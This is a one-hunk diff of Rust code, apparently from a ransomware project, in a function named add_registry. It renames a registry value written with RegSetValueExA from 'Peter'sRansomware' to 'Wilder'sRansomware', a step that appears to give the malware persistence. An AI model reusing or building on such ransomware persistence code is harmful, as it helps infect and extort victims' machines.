@@ -100,7 +100,7 @@ fn add_registry() -> bool {
 
             if RegSetValueExA(
                 registry_handle,
-                CString::new("Peter'sRansomware").unwrap().as_ptr(),
+                CString::new("Wilder'sRansomware").unwrap().as_ptr(),
                 0,
                 REG_SZ,
                 path.as_ptr(),
